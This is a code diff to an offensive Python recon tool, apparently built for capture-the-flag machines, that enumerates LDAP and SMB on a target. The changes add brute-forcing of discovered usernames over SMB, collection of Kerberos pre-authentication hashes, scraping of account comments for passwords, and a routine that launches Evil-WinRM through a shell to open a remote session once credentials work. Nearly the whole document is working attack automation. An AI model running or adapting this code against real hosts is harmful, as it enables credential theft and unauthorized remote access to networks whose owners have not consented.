@@ -2,14 +2,12 @@
 
 import os
 from sty import fg
-from autorecon.lib import nmapParser
-from autorecon.utils import config_parser
+from autorecon.lib import nmapParser, ldap_imp, rpcenum
+from autorecon.utils import config_parser, helper_lists
 import re
 from subprocess import call, PIPE, Popen
 import requests
-from autorecon.utils import helper_lists
 from collections.abc import Iterable
-from autorecon.lib import ldap_imp
 from impacket.smbconnection import SMBConnection, SessionError
 from time import sleep
 
@@ -21,20 +19,6 @@ class LdapEnum:
         self.target = target
         self.processes = ""
         self.ldapper = ldap_imp.enumLdap(self.target)
-
-    def ldapSearch(self):
-        """This will run a helper bash script that will attempt to login to smb
-        using smbmap if any valid SambaNTHashes are found using a
-        passthe hash technique."""
-        np = nmapParser.NmapParserFunk(self.target)
-        np.openPorts()
-        ldap_ports = np.ldap_ports
-        if len(ldap_ports) == 0:
-            pass
-        else:
-            # ToDo: Rewrite this script in python!
-            ldap_enum = f"{os.getcwd()}/lib/ldap.sh {self.target}"
-            call(ldap_enum, shell=True)
 
     def Scan(self):
         """If Ldap ports are open, run nmap ldap scripts, enum4linux and the results
@@ -81,6 +65,7 @@ class LdapEnum:
             def check_parse_hashes():
                 print(f"[{fg.li_magenta}+{fg.rs}] Creating List of Valid Usernames")
                 users = parse_users()
+                print(f"[{fg.li_green}+{fg.rs}] Checking for Kerberos Pre-Authentication TGT Hashes")
                 domain = self.ldapper.get_domain()
                 hashes = []
                 if domain and users:
@@ -129,8 +114,9 @@ class LdapEnum:
                                 # print(i.split(":")[1])
                         return zip(usernames, passwords)
 
-            def usernameAndPassword(creds=None):
+            def check_auth(creds=None):
                 valid_creds = []
+                print(f"[{fg.li_magenta}+{fg.rs}] Brute-Forcing found usernames over SMB")
                 for user in parse_users():
                     try:
                         smb = SMBConnection(self.target, self.target)
@@ -140,8 +126,49 @@ class LdapEnum:
                         print(f"Testing valid login: {user}:{creds if creds is not None else user} True or False? {fg.red}{test_login}{fg.rs}")
                     if test_login is True:
                         valid_creds.append(user)
-                        print(f"Testing valid login: {user}:{creds if creds is not None else user} True or False? {fg.li_green}{test_login}{fg.rs}")
+                        print(f"\n[{fg.li_green}+{fg.rs}] Valid Credentials Found! {fg.li_green}{user}{fg.rs}:{fg.li_green}{creds if creds is not None else user}{fg.rs}\n")
                 return valid_creds
+
+            def query_disp_info():
+                domain = self.ldapper.get_domain()
+                sdi = rpcenum.SamrDisplayInfo(self.target, domain)
+                dump_user_info = sdi.dump(self.target, self.target)
+                checklist = ['pass', 'Pass']
+                possible_credentials = []
+                for i in dump_user_info:
+                    if any(s in i['AdminComment'] for s in checklist):
+                        # print(i['AdminComment'])
+                        possible_credentials.append(i['AdminComment'])
+                return possible_credentials
+
+            def check_possible_creds():
+                check_for_creds = query_disp_info()
+                if check_for_creds:
+                    wordlist = ' '.join(check_for_creds).split()
+                    for word in wordlist:
+                        valid_login = check_auth(creds=word)
+                        if valid_login:
+                            print("Found Creds {}:{}".format(valid_login, word))
+                            return (valid_login[0], word)
+
+            def winrm_connect(username, password):
+                r = requests.post(f"http://{self.target}:5985/wsman", data="")
+                if r.status_code == 401:
+                    try:
+                        dope = f"""{c.getCmd("winrm", "evilWinRM", username=username, password=password, SHELL="$SHELL")}"""
+                        print(f"[{fg.li_magenta}+{fg.rs}] Found Valid Credentials!!!")
+                        print(f"[{fg.li_magenta}+{fg.rs}] {fg.li_green}{username}:{password}{fg.rs}")
+                        print(f"[{fg.li_magenta}+{fg.rs}] Evil-WinRM !!!")
+                        print(f"[{fg.li_magenta}+{fg.rs}] " + dope)
+                        print(f"[{fg.li_magenta}+{fg.rs}] Enjoy the Shell Playboy ;) ")
+                        kwargs = {}
+                        kwargs.update(start_new_session=True)
+                        revshell = Popen(args=dope, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True, **kwargs)
+                        assert not revshell.poll()
+
+                    except IOError as e:
+                        print(e)
+                        exit()
 
             def monteverde(password):
                 if os.path.exists(c.getPath("loot", "authSmbmap")):
@@ -160,28 +187,12 @@ class LdapEnum:
                             with open(c.getPath("loot", "azure"), "rb") as azure_file:
                                 doc = xmltodict.parse(azure_file.read())
                                 azure_pass = doc['Objs']['Obj']['Props']['S']['#text']
-                                try:
-                                    auth_user = usernameAndPassword(creds=azure_pass)
-                                    r = requests.post(f"http://{self.target}:5985/wsman", data="")
-                                    if r.status_code == 401:
-                                        if azure_pass:
-                                            if auth_user:
-                                                dope = f"""{c.getCmd("winrm", "evilWinRM", username=auth_user[0], password=azure_pass, SHELL="$SHELL")}"""
-                                                print(f"[{fg.li_magenta}+{fg.rs}] Found Valid Credentials!!!")
-                                                print(f"[{fg.li_magenta}+{fg.rs}] {fg.li_green}{azure_pass}{fg.rs}")
-                                                print(f"[{fg.li_magenta}+{fg.rs}] Evil-WinRM !!!")
-                                                print(f"[{fg.li_magenta}+{fg.rs}] " + dope)
-                                                print(f"[{fg.li_magenta}+{fg.rs}] Enjoy the Shell Playboy ;) ")
-                                                kwargs = {}
-                                                kwargs.update(start_new_session=True)
-                                                revshell = Popen(args=dope, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True, **kwargs)
-                                                assert not revshell.poll()
-
-                                except IOError as e:
-                                    print(e)
-                                    exit()
+                                auth_user = check_auth(creds=azure_pass)
+                                if azure_pass:
+                                    if auth_user:
+                                        winrm_connect(auth_user[0], azure_pass)
                         except FileNotFoundError as fnf_err:
-                            print(fnf_err)
+                            print("FileNotFound: {}".format(fnf_err))
 
             def checkWinRm():
                 if HeresJonny() is True:
@@ -198,26 +209,12 @@ class LdapEnum:
                             users.append(k)
                             passwords.append(v)
                         if len(users) != 0 and (len(passwords) != 0):
-                            try:
-                                dope = f"""{c.getCmd("winrm", "evilWinRM", username=users[0], password=passwords[0], SHELL="$SHELL")}"""
-                                print(f"[{fg.li_magenta}+{fg.rs}] Found Valid Credentials!!!")
-                                print(f"[{fg.li_magenta}+{fg.rs}] {fg.li_green}{user_pass}{fg.rs}")
-                                print(f"[{fg.li_magenta}+{fg.rs}] Evil-WinRM !!!")
-                                print(f"[{fg.li_magenta}+{fg.rs}] " + dope)
-                                print(f"[{fg.li_magenta}+{fg.rs}] Enjoy the Shell Playboy ;) ")
-                                kwargs = {}
-                                kwargs.update(start_new_session=True)
-                                revshell = Popen(args=dope, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True, **kwargs)
-                                assert not revshell.poll()
-
-                            except IOError as e:
-                                print(e)
-                                exit()
+                            winrm_connect(users[0], passwords[0])
                 else:
                     print(f"[{fg.red}+{fg.rs}] No valid Credentials Found. {fg.red}Try Harder{fg.rs}")
                     if not os.path.exists(c.getPath("loot", "lootDir")):
                         os.makedirs(c.getPath("loot", "lootDir"))
-                    valid_password = usernameAndPassword()
+                    valid_password = check_auth()
                     if valid_password:
                         print(f"{fg.li_green}[!]{fg.rs} Found Valid Credentials!!!\n Username: {fg.li_green}{valid_password[0]}{fg.rs}\n Password: {fg.li_green}{valid_password[0]}{fg.rs}\n")
                         print(f"[{fg.li_magenta}+{fg.rs}] Running smbmap with credentials")
@@ -234,5 +231,8 @@ class LdapEnum:
                             """
                             print(f"{fg.li_magenta}{autopwn_banner}{fg.rs}")
                             monteverde(valid_password[0])
+                    else:
+                        creds_ = check_possible_creds()
+                        winrm_connect(creds_[0], creds_[1])
 
             checkWinRm()
